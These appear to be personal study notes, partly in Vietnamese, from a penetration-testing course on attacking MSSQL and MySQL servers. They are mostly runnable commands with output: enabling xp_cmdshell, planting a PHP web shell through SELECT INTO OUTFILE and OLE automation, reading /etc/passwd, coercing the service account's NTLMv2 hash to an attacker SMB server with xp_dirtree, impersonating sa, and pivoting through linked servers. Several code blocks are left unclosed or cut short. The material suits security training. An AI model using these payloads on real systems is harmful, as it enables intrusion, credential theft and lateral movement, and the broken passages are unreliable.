Authentication Mechanisms
Có 2 type : Windows authentication mode và Mixed mode

Misconfigurations : Misconfigured authentication in SQL Server can let us access the service without credentials if anonymous access is enabled, a user without a password is configured, or any user, group, or machine is allowed to access the SQL Server.

Privileges
Depending on the user's privileges, we may be able to perform different actions within a SQL Server, such as:
  Read or change the contents of a database
  Read or change the server configuration
  Execute commands
  Read local files
  Communicate with other databases
  Capture the local system hash
  Impersonate existing users
  Gain access to other networks

Protocol Specific Attacks

Sqlcmd - Connecting to the SQL Server
```
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

```
Note: When we authenticate to MSSQL using sqlcmd we can use the parameters -y (SQLCMDMAXVARTYPEWIDTH) and -Y (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.


If we are targetting MSSQL from Linux, we can use sqsh as an alternative to sqlcmd:
```
naruto3co@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

Alternatively, we can use the tool from Impacket with the name mssqlclient.py.
```
naruto3co@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Note: When we authenticate to MSSQL using sqsh we can use the parameters -h to disable headers and footers for a cleaner look.

When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use SERVERNAME\\accountname or .\\accountname. The full command would look like:
```

SQL Default Databases
Before we explore using SQL syntax, it is essential to know the default databases for MySQL and MSSQL. Those databases hold information about the database itself and help us enumerate database names, tables, columns, etc. With access to those databases, we can use some system stored procedures, but they usually don't contain company data.

MySQL default system schemas/databases:
  mysql - is the system database that contains tables that store information required by the MySQL server
  information_schema - provides access to database metadata
  performance_schema - is a feature for monitoring MySQL Server execution at a low level
  sys - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

MSSQL default system schemas/databases:
  master - keeps the information for an instance of SQL Server.
  msdb - used by SQL Server Agent.
  model - a template database copied for each new database.
  resource - a read-only database that keeps system objects visible in every database on the server in sys schema.
  tempdb - keeps temporary objects for SQL queries.

SQL Syntax
Show Databases
```
mysql> SHOW DATABASES;

+--------------------+
| information_schema |
| htbusers           |
+--------------------+
2 rows in set (0.00 sec)
```

If we use sqlcmd, we will need to use GO after our query to execute the SQL syntax.

```
1> SELECT name FROM master.dbo.sysdatabases
2> GO

--------------------------------------------------
master
tempdb
model

#Execute Commands

MSSQL has a extended stored procedures called xp_cmdshell which allow us to execute system commands using SQL. Keep in mind the following about xp_cmdshell:
  xp_cmdshell is a powerful feature and disabled by default. xp_cmdshell can be enabled and disabled by using the Policy-Based Management or by executing sp_configure
  The Windows process spawned by xp_cmdshell has the same security rights as the SQL Server service account
  xp_cmdshell operates synchronously. Control is not returned to the caller until the command-shell command is completed

To execute commands using SQL syntax on MSSQL, use:
XP_CMDSHELL
```
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```
If xp_cmdshell is not enabled, we can enable it, if we have the appropriate privileges, using the following command:
```
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```
There are other methods to get command execution, such as adding extended stored procedures, CLR Assemblies, SQL Server Agent Jobs, and external scripts. However, besides those methods there are also additional functionalities that can be used like the xp_regwrite command that is used to elevate privileges by creating new entries in the Windows registry. Nevertheless, those methods are outside the scope of this module.

MySQL supports User Defined Functions which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this GitHub repository. It is not common to encounter a user-defined function like this in a production environment, but we should be aware that we may be able to use it.


###Write Local Files

MySQL does not have a stored procedure like xp_cmdshell, but we can achieve command execution if we write to a location in the file system that can execute our commands. For example, suppose MySQL operates on a PHP-based web server or other programming languages like ASP.NET. If we have the appropriate privileges, we can attempt to write a file using SELECT INTO OUTFILE in the webserver directory. Then we can browse to the location where the file is and execute our commands.

###MySQL - Write Local File

```
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```
In **MySQL**, a global system variable **secure_file_priv** limits the effect of data import and export operations, such as those performed by the LOAD DATA and SELECT … INTO OUTFILE statements and the **LOAD_FILE()** function. These operations are permitted only to users who have the FILE privilege.

**secure_file_priv** may be set as follows:
  If empty, the variable has no effect, which is not a secure setting.
  If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
  If set to NULL, the server disables import and export operations.


In the following example, we can see the secure_file_priv variable is empty, which means we can read and write data using MySQL:
###MySQL - Secure File Privileges
```
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```
To write files using MSSQL, we need to enable **Ole Automation Procedures**, which requires admin privileges, and then execute some stored procedures to create the file:
MSSQL - Enable Ole Automation Procedures
```
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

MSSQL - Create a File
```
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

###Read Local Files
By default, MSSQL allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:
###Read Local Files in MSSQL
```
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should

(1 rows affected)
```

As we previously mentioned, by default a MySQL installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:
```
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

```

#Capture MSSQL Service Hash
In the Attacking SMB section, we discussed that we could create a fake SMB server to steal a hash and abuse some default implementation within a Windows operating system. We can also steal the MSSQL service account hash using xp_subdirs or xp_dirtree undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.

To make this work, we need first to start Responder or impacket-smbserver and execute one of the following SQL queries:

###XP_DIRTREE Hash Stealing
```
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

subdirectory    depth
--------------- -----------
```

###XP_SUBDIRS Hash Stealing
```
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
```
If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.


###XP_SUBDIRS Hash Stealing with Responder
```
naruto3co@htb[/htb]$ sudo responder -I tun0

###Impersonate Existing Users with MSSQL

SQL Server has a special permission, named IMPERSONATE, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends. Let's explore how the IMPERSONATE privilege can lead to privilege escalation in SQL Server.

First, we need to identify users that we can impersonate. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned. We can use the following query to identify users we can impersonate:

###Identify Users that We Can Impersonate
```
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```
To get an idea of privilege escalation possibilities, let's verify if our current user has the sysadmin role:

###Verifying our Current User and Role
```
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```
As the returned value 0 indicates, we do not have the sysadmin role, but we can impersonate the sa user. Let us impersonate the user and execute the same commands. To impersonate a user, we can use the Transact-SQL statement EXECUTE AS LOGIN and set it to the user we want to impersonate.

###Impersonating the SA User
```
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

Note: It's recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using USE master.

We can now execute any command as a sysadmin as the returned value 1 indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement REVERT.
Note: If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.

#Communicate with Other Databases with MSSQL
MSSQL has a configuration option called linked servers. Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.

If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance. Let's see how we can identify and execute queries on linked servers.

###Identify linked Servers in MSSQL
```
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```
As we can see in the query's output, we have the name of the server and the column isremote, where 1 means is a remote server, and 0 is a linked server. We can see sysservers Transact-SQL for more information.

Next, we can attempt to identify the user used for the connection and its privileges. The EXECUTE statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets ([ ]).

```
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```
Note: If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).

As we have seen, we can now execute queries with sysadmin privileges on the linked server. As sysadmin, we control the SQL Server instance. We can read data from any database or execute system commands with xp_cmdshell. This section covered some of the most common ways to attack SQL Server and MySQL databases during penetration testing engagements. There are other methods for attacking these database types as well as others, such as PostGreSQL, SQLite, Oracle, Firebase, and MongoDB which will be covered in other modules. It is worth taking some time to read up on these database technologies and some of the common ways to attack them as well.

             IP: 10.10.110.17                       (Target)
             -------------------                     -----------------------
             | Fake SMB Server |                    | SQL Service Account |
             |  (Responder)    |                    |   runs MSSQL        |
             -------------------                     -----------------------
                       |                                       |
                       | 1. Start SMB listener                 |
                       |-------------------------------------->|
                       |                                       |
                       |                                       |
                       |<--------------------------------------|
                       | 2. Attacker sends SQL command         |
                       |    remotely to MSSQL:                 |
                       |                                       |
                       |   EXEC xp_dirtree '\\10.10.110.17\share\';
                       |                                       |
                       |                                       |
                       |                                       |
                       |                                       |
                       |-------------------------------------->|
                       | 3. MSSQL tries to access SMB share     |
                       |    to list directories                 |
                       |                                       |
                       |                                       |
                       |-------------------------------------->|
                       | 4. Windows MUST authenticate to SMB     |
                       |    → sends NTLMv2 HASH of SQL service   |
                       |      account to Attacker                |
                       |                                       |
                       |                                       |
                       |<---------------------------------------|
                       | 5. Attacker receives NTLMv2 Hash       |
             -------------------                    
             |  HASH CAPTURED! |   Example:
             |  username: mssqlsvc
             |  hash:  <NTLMv2 blob>  
             -------------------

==============================================================
Điều kiện để thành công là
  ✔ Attacker đã login vào MSSQL (dù chỉ là SQL quyền thấp).
  ✔ Attacker có khả năng chạy lệnh SQL như EXEC xp_dirtree ....
